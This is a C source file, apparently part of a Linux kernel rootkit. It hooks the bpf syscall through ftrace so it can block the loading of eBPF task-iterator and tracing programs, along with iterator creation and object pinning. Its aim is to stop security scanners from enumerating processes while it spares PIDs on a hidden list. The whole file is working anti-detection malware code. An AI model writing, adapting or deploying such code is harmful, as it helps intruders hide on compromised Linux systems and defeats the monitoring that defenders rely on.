/*https://www.youtube.com/watch?v=xvFZjo5PgG0*/

#include "../include/core.h"
#include "../ftrace/ftrace_helper.h"
#include "../include/hidden_pids.h"
#include "../include/bpf_hook.h"

#define BPF_PROG_LOAD       5
#define BPF_OBJ_PIN         6
#define BPF_ITER_CREATE     21
#define BPF_LINK_CREATE     28

#define BPF_PROG_TYPE_TRACING 26

#define MAX_TRACKED 64
#define SCAN_WINDOW_JIFFIES (HZ * 30)

struct scanner_behavior {
    pid_t pid;
    unsigned long first_seen;
    unsigned long last_call;
    unsigned int bpf_prog_loads;
    unsigned int bpf_iter_attempts;
    bool marked_suspicious;
};

static struct scanner_behavior scanners[MAX_TRACKED];
static DEFINE_SPINLOCK(scanner_lock);

static asmlinkage long (*orig_bpf)(const struct pt_regs *);
static asmlinkage long (*orig_bpf_ia32)(const struct pt_regs *);

notrace static inline bool should_hide_pid_by_int(int pid)
{
    int i;
    if (pid <= 0)
        return false;

    if (hidden_count < 0 || hidden_count > MAX_HIDDEN_PIDS)
        return false;

    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid)
            return true;
    }
    return false;
}

notrace static int get_or_create_scanner_idx_locked(pid_t pid, unsigned long now)
{
    int i, empty = -1;

    for (i = 0; i < MAX_TRACKED; i++) {
        if (scanners[i].pid != 0 &&
            time_after(now, scanners[i].last_call + SCAN_WINDOW_JIFFIES)) {
            memset(&scanners[i], 0, sizeof(scanners[i]));
        }

        if (scanners[i].pid == pid) {
            scanners[i].last_call = now;
            return i;
        }
        if (scanners[i].pid == 0 && empty == -1)
            empty = i;
    }

    if (empty >= 0) {
        scanners[empty].pid = pid;
        scanners[empty].first_seen = now;
        scanners[empty].last_call = now;
        scanners[empty].bpf_prog_loads = 0;
        scanners[empty].bpf_iter_attempts = 0;
        scanners[empty].marked_suspicious = false;
        return empty;
    }

    return -1;
}

notrace static inline bool is_word_char(char c)
{
    return (c >= 'a' && c <= 'z') ||
           (c >= '0' && c <= '9') ||
           (c == '_');
}

notrace static bool contains_word(const char *name, size_t name_len,
                          const char *word, size_t word_len)
{
    size_t i;

    if (!name || !word || word_len == 0 || name_len == 0)
        return false;

    if (word_len > name_len)
        return false;

    for (i = 0; i + word_len <= name_len; i++) {
        size_t j;
        for (j = 0; j < word_len; j++) {
            if (name[i + j] != word[j])
                break;
        }
        if (j != word_len)
            continue;

        bool start_ok = (i == 0) || !is_word_char(name[i - 1]);
        bool end_ok = (i + word_len >= name_len) || !is_word_char(name[i + word_len]);

        if (start_ok && end_ok)
            return true;
    }
    return false;
}

notrace static bool is_task_iterator_load(union bpf_attr __user *uattr, unsigned int size)
{
    union bpf_attr kattr;
    char name[BPF_OBJ_NAME_LEN];
    size_t copy_size;
    int i;

    if (!uattr || size == 0)
        return false;

    copy_size = min_t(size_t, size, sizeof(kattr));
    memset(&kattr, 0, sizeof(kattr));

    if (copy_from_user(&kattr, uattr, copy_size))
        return false;

    if (kattr.prog_type == BPF_PROG_TYPE_TRACING)
        return true;

    memset(name, 0, sizeof(name));
    for (i = 0; i < BPF_OBJ_NAME_LEN - 1 && kattr.prog_name[i]; i++) {
        char c = kattr.prog_name[i];
        if (c >= 'A' && c <= 'Z')
            c = c + ('a' - 'A');
        name[i] = c;
    }

    const char *words[] = { "task", "sched", "proc", "iter", "pid", "enum" };
    const size_t nwords = ARRAY_SIZE(words);
    size_t name_len = strnlen(name, BPF_OBJ_NAME_LEN);

    if (name_len == 0)
        return false;

    for (i = 0; i < nwords; i++) {
        const char *w = words[i];
        size_t wlen = strlen(w);
        if (contains_word(name, name_len, w, wlen))
            return true;
    }

    return false;
}

notrace static bool check_proc_enumeration_pattern(void)
{
    struct files_struct *files;
    struct fdtable *fdt;
    struct file *file;
    int i, proc_fds = 0;

    rcu_read_lock();
    files = rcu_dereference(current->files);
    if (!files) {
        rcu_read_unlock();
        return false;
    }

    fdt = files_fdtable(files);
    if (!fdt) {
        rcu_read_unlock();
        return false;
    }

    for (i = 0; i < min(fdt->max_fds, 64); i++) {
        file = rcu_dereference(fdt->fd[i]);
        if (!file || !file->f_path.dentry)
            continue;

        const char *name = file->f_path.dentry->d_name.name;
        if (!name)
            continue;

        if (strnlen(name, 64) < 64 &&
            (strcmp(name, "proc") == 0 || strcmp(name, "bpf") == 0))
            proc_fds++;
    }

    rcu_read_unlock();
    return (proc_fds >= 2);
}

notrace static bool analyze_and_should_block(int cmd, union bpf_attr __user *uattr, unsigned int size)
{
    unsigned long flags;
    pid_t pid = current->tgid;
    bool block = false;
    int idx = -1;
    unsigned long now = jiffies;

    if (pid <= 1 || should_hide_pid_by_int(pid))
        return false;

    spin_lock_irqsave(&scanner_lock, flags);
    idx = get_or_create_scanner_idx_locked(pid, now);
    if (idx < 0) {
        spin_unlock_irqrestore(&scanner_lock, flags);
        return false;
    }

    switch (cmd) {
        case BPF_PROG_LOAD:
            scanners[idx].bpf_prog_loads++;
            if (is_task_iterator_load(uattr, size)) {
                scanners[idx].marked_suspicious = true;
                block = true;
            }
            break;

        case BPF_ITER_CREATE:
        case BPF_LINK_CREATE:
            scanners[idx].bpf_iter_attempts++;
            scanners[idx].marked_suspicious = true;
            block = true;
            break;

        case BPF_OBJ_PIN:
            if (scanners[idx].marked_suspicious)
                block = true;
            break;
    }

    if (scanners[idx].bpf_prog_loads >= 5 || scanners[idx].bpf_iter_attempts >= 3)
        scanners[idx].marked_suspicious = true;

    bool was_marked = scanners[idx].marked_suspicious;
    spin_unlock_irqrestore(&scanner_lock, flags);

    if (!block && check_proc_enumeration_pattern()) {
        spin_lock_irqsave(&scanner_lock, flags);
        if (idx >= 0 && scanners[idx].pid == pid) {
            scanners[idx].marked_suspicious = true;
            block = true;
        }
        spin_unlock_irqrestore(&scanner_lock, flags);
    } else {
        if (!block && was_marked && cmd == BPF_OBJ_PIN)
            block = true;
    }

    return block;
}

notrace static asmlinkage long hook_bpf(const struct pt_regs *regs)
{
    int cmd;
    union bpf_attr __user *uattr;
    unsigned int size;

    if (!orig_bpf)
        return -ENOSYS;

    cmd = (int)regs->di;
    uattr = (union bpf_attr __user *)regs->si;
    size = (unsigned int)regs->dx;

    if ((cmd == BPF_PROG_LOAD || cmd == BPF_ITER_CREATE ||
         cmd == BPF_LINK_CREATE || cmd == BPF_OBJ_PIN) &&
        size > 0 && size <= sizeof(union bpf_attr)) {

        if (analyze_and_should_block(cmd, uattr, size))
            return -EPERM;
    }

    return orig_bpf(regs);
}

notrace static asmlinkage long hook_bpf_ia32(const struct pt_regs *regs)
{
    int cmd;
    union bpf_attr __user *uattr;
    unsigned int size;

    if (!orig_bpf_ia32)
        return -ENOSYS;

    cmd = (int)regs->bx;
    uattr = (union bpf_attr __user *)regs->cx;
    size = (unsigned int)regs->dx;

    if ((cmd == BPF_PROG_LOAD || cmd == BPF_ITER_CREATE ||
         cmd == BPF_LINK_CREATE || cmd == BPF_OBJ_PIN) &&
        size > 0 && size <= sizeof(union bpf_attr)) {

        if (analyze_and_should_block(cmd, uattr, size))
            return -EPERM;
    }

    return orig_bpf_ia32(regs);
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_bpf", hook_bpf, &orig_bpf),
    HOOK("__ia32_sys_bpf", hook_bpf_ia32, &orig_bpf_ia32),
};

notrace int bpf_hook_init(void)
{
    memset(scanners, 0, sizeof(scanners));

    int ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (ret != 0)
        return 0;

    return 0;
}

notrace void bpf_hook_exit(void)
{
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    memset(scanners, 0, sizeof(scanners));
}
